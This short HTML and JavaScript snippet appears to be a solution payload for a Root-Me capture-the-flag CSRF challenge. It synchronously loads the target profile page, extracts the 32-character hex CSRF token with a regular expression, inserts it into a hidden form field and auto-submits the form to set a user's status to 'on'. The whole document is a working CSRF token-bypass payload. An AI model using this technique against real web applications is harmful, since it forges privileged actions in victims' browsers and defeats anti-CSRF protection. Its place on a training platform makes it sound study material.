<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" id="form1" method="post" enctype="multipart/form-data">
	<input id="username" type="text" name="username" value="zeb">
	<input id="status" type="hidden" name="status" value="on">
	<input id="token" type="hidden" name="token" value="">
</form>
<script>
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
	xhr.send();

	var csrf_token = (xhr.responseText.match(/[abcdef0123456789]{32}/));

	document.getElementById('token').setAttribute('value', csrf_token)

	document.getElementById("form1").submit();
</script>
